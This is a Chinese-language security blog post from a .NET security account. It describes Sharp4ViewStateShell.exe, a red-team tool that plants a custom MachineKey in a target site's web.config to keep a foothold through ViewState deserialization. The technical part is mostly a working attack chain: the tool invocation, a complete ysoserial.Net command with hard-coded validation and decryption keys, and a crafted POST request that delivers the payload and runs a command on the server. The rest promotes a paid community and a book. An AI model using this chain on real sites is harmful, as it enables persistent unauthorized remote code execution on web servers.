#  基于 ViewState 反序列化漏洞，通过 Sharp4ViewStateShell 执行命令实现权限维持   
原创 专攻.NET安全的  dotNet安全矩阵   2025-06-04 00:23  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/NO8Q9ApS1YibJO9SDRBvE01T4A1oYJXlTBTMvb7KbAf7z9hY3VQUeayWI61XqQ0ricUQ8G1FykKHBNwCqpV792qg/640?wx_fmt=gif&from=appmsg&wxfrom=5&wx_lazy=1&tp=webp "")  
  
在红队中持久化访问权限是关键环节之一，Sharp4ViewStateShell.exe  
 是一款专门为.NET Web站点设计的权限维持工具，其核心思想是通过配置自定义的 MachineKey  
，结合 .NET 的 ViewState 反序列化漏洞，实现远程命令执行并维持访问权限。本文将详细讲解该工具的使用方式及其利用链流程，帮助红队人员快速完成权限维持操作。  
  
**01. 工具基本介绍**  
  
  
  
Sharp4ViewStateShell.exe自动修改 .NET 的 web.config  
 文件，插入自定义 MachineKey  
，用于后续利用 ViewState 反序列化漏洞实现远程命令执行。  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y8XbYZSx0wmibrjr5HlKHd9BF2lJnqw4MkzssIx7aW6lKRKSAWNIPCE89uBLKe13qtMlOudCuK3B4g/640?wx_fmt=jpeg&from=appmsg "")  
  
**02. 工具实战用法**  
  
  
  
一键运行 Sharp4ViewStateShell.exe  
 修改目标站点的 web.config，直接运行 Sharp4ViewStateShell.exe，无需任何参数。  
  
```
Sharp4ViewStateShell.exe
```  
  
  
执行后，该工具会自动为站点插入 MachineKey 配置项，如下图所示。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y8XbYZSx0wmibrjr5HlKHd9BMgNsvCEVKlCekZKzibBsCdgdIUImBDyJTcc3apzYiaNfwC1I9ibr3EUbw/640?wx_fmt=png&from=appmsg "")  
  
接着，访问目标页面单个 aspx页面  
，使用浏览器开发者工具或 Burp Suite 抓包工具，找到页面源码中类似如下内容：  
  
```
<input type="hidden" name="__VIEWSTATEGENERATOR" id="__VIEWSTATEGENERATOR"value="DBC4925F"/>
```  
  
  
随  
后，使用 ysoserial.Net  
 构造带有命令执行，比如 tasklist 的ViewState负载，命令如下所示。  
  
```
ysoserial.exe -p ViewState -g XamlAssemblyLoadFromFile -c "./ExploitClass.cs;./dlls/System.dll;./dlls/System.Web.dll;./dlls/Microsoft.AspNet.FriendlyUrls.dll" \--validationalg="SHA1" \--validationkey="28E969418EFBAF7DAF4A05B12A9F588774129BA306ED094A0C9CA70A45F6C4A83512EB9CF050D7261ADA8E57728B830E540BC26394CEF1F43AEC642AD61D894F" \--decryptionalg="AES" \--decryptionkey="F6F6CB3C4FE662991CEF709C5A2ACDDD228FDF21CD708186736FE4B3E008B3A6" \--generator="DBC4925F"
```  
  
  
执行后将输出一个经过Base64编码的 __VIEWSTATE  
 值，如下图所示。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y8XbYZSx0wmibrjr5HlKHd9BClUwFFNLPCN5mibotpAQwlGQAbArFNJKdX15MhpIs7icwx4yM6voD9tQ/640?wx_fmt=png&from=appmsg "")  
  
最后，构造如下 POST 请求，并将上一步生成的 ViewState 值粘贴到 __VIEWSTATE  
 参数中：  
  
```
POST /ViewState.aspx HTTP/1.1Host:localhostPragma: no-cacheCache-Control: no-cacheUser-Agent: Mozilla/5.0(Windows NT 10.0; Win64; x64) Chrome/137.0.0.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,;q=0.8Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeContent-Type: application/x-www-form-urlencodedContent-Length:9337form1_r=0.7834879954225045&form1_t=1734416003580&form1_d=1734416071170&form1_e=2&__VIEWSTATE=【此处粘贴生成的ViewState】
```  
  
  
将该请求发送到 ViewState.aspx  
 页面，成功后页面响应可能包含命令执行结果，tasklist 命令已被成功执行，实现远程RCE，如下图所示。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y8XbYZSx0wmibrjr5HlKHd9BOmEmqm5jdrG254MekDD64q4hcTEicYXcceoC7eSYASibayhTHTxaWwBQ/640?wx_fmt=png&from=appmsg "")  
  
综上，Sharp4ViewStateShell.exe  
 利用了 .NET 的 ViewState 反序列化机制配合自定义 MachineKey，实现持久化远程命令执行，非常适合在红队渗透中用于权限维持。  
文章涉及的工  
具已  
打包在星球，感兴趣的朋友可以加入自取。  
  
**03.NET安全扩展学习**  
  
  
  
以上相关的知识点已收录于  
新书《.NET安全攻防指南》，全书共计25章，总计1010页，分为上下册，横跨.NET Web代码审计与红队渗透两大领域。  
  
  
**上册深入剖析.NET Web安全审计的核心技术，帮助读者掌握漏洞发现与修复的精髓；下册则聚焦于.NET逆向工程与攻防对抗的实战技巧，揭秘最新的对抗策略与技术方法。**  
  
  
**04. 技术精华内容**  
  
  
  
从漏洞分析到安全攻防，我们涵盖了 .NET 安全各个关键方面，为您呈现最新、最全面的 .NET 安全知识，下面是公众号发布的精华文章集合，推荐大伙阅读！  
  
[](https://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247499267&idx=2&sn=1462cf23c9a8568cc80705d2d3a1a69e&scene=21#wechat_redirect)  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y8A7Qhn1ssuqNzv0iceS7ZhOuZ0AO4P1eFeG2xTdR2V6GWibiaxO2RenUJzrwOfvsdqofibI6H2uY0CLQ/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
[](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247493952&idx=4&sn=db68011fb075c1d02268811163646b53&chksm=fa5947adcd2ecebbb1ca6659f289a5e344e37d1136fe0bd9272b5578e4c71bb19bb250e934d3&scene=21#wechat_redirect)  
  
  
[](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247495167&idx=1&sn=9280c55fdc7c9146e549be470cf9f120&chksm=fa594312cd2eca04bfe8fd1fd3890b389d9c700b9b69d897f919addac399bab4f4d2e55f6b4f&scene=21#wechat_redirect)  
  
  
[](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247490722&idx=2&sn=c9807daa5548e139a0c67303cb26882a&chksm=fa5ab24fcd2d3b59a85be03e69c655ffd644e8458bc2ec3f572da4b40b43e5003fda756f35b4&scene=21#wechat_redirect)  
  
  
  
[](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247490703&idx=2&sn=e7db1ff662e5b41d9a1806fbdf33e204&chksm=fa5ab262cd2d3b7470f029b9a07d1dd3611e63be910b01a601144efe7d84b5f016f488a354cf&scene=21#wechat_redirect)  
  
  
  
[](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247490700&idx=2&sn=e8a865ada7c743e77fb9e953c5da74b1&chksm=fa5ab261cd2d3b7736387eddfc8524a378a1604552d0c9b55476646f9e8275f48818aab8acad&scene=21#wechat_redirect)  
  
  
  
[](http://mp.weixin.qq.com/s?__biz=MzUyOTc3NTQ5MA==&mid=2247488736&idx=2&sn=d24aaa297c51eb620ccdf67af513086d&chksm=fa5aba0dcd2d331bbb22f3f5657199d718c90efed42fcb9cb67ec23d342f887c117e4858f1cb&scene=21#wechat_redirect)  
  
  
**05. 加入安全社区**  
  
  
  
目前dot.Net安全矩阵星球已成为中国.NET安全领域最知名、最专业的技术知识库之一，超 **1200+**  
 成员一起互动学习。星球主题数量近 **600+**  
，精华主题   
230+  
，PDF文档和压缩包   
300+   
。从Web应用到PC端软件应用，无论您是初学者还是经验丰富的开发人员，都能在这里找到对应的实战指南和最佳实践。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y9AiaXibTRdEnEfYuQx76FjZVjmyEWtIaDuDePFFmyRqggiaq2k47pLoib9GZtUCOhaP40WPlhvbiaKZVg/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
## 20+专栏文章  
  
星球文化始终认为授人以鱼不如授人以渔！星球整理出**20+**  
个专题栏目涵盖 **.NET安全 点、线、面、体等知识范围**  
，助力师傅们实战攻防！其中主题包括.NET  内网攻防、漏洞分析、内存马、代码审计、预编译、反序列化、WebShell免杀、命令执行、工具库等等。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y8xRheDpQ7NsESosdNZUopa90SJRuwnLy9uZV4icrXiaZlJPQlYJWXTw8HCrF9oTcE3DDgrdFnXo2BA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
## 海量资源和工具  
  
截至当前，dot.Net安全矩阵星球社区汇聚了   
**600+**  
 个实用工具和高质量PDF学习资料。这些资源涵盖了攻防对抗的各个方面，在实战中能够发挥显著作用，为对抗突破提供强有力的支持。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y8xRheDpQ7NsESosdNZUopaqVZW8XsALVA4FNiaj32q8npN82VSeqSKb4fQvLiczFNs0099VRFVQwPA/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y8xRheDpQ7NsESosdNZUopa63ZXbX3YXLwoeNnjStcRtTbU9hoe6ecO5hhkj2apG1I6tKlkpz5GaQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
## 专属成员交流群  
  
我们还有多个成员专属的  
**内部星球陪伴群**  
，加入的成员可以通过在群里提出问题或参与论的方式来与其他成员交流思想和经验。此外还可以通过星球或者微信群私聊向我们进行提问，以获取帮助迅速解决问题。  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1Y8xRheDpQ7NsESosdNZUopaAiaouHb6HYza539m9v0ykDoD2JezaArDZBPlJInuabf6XsduzVcjZ0Q/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
## 已入驻的大咖们  
  
星球汇聚了各行业安全攻防技术大咖，并且每日分享.NET安全技术干货以及交流解答各类技术等问题，社区中发布很多  
**高质量的.NET安全资源**  
，可以说市面上很少见，都是干货。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NO8Q9ApS1YibEkb2HkMVuw4d7qjcTYUtl04w8xDiaUaJxticro644uWw5XuJ6ZXCNXCticjYWjpXNmp3omQHUNFRPg/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&tp=webp "")  
## 欢迎加入我们  
  
dotNet安全矩阵星球从创建以来一直聚焦于.NET领域的安全攻防技术，定位于高质量安全攻防星球社区，也得到了许多师傅们的支持和信任，通过星球深度连接入圈的师傅们，一起推动.NET安全高质量的向前发展。  
**星球门票后期价格随着内容和质量的不断沉淀会适当提高，因此越早加入越好！**  
  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/NO8Q9ApS1Y8xRheDpQ7NsESosdNZUopag09JtYcKpucjZPAlfeqC1ovcQvhrkemAzbURDaVF3InmpQshiatDnyQ/640?wx_fmt=other&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
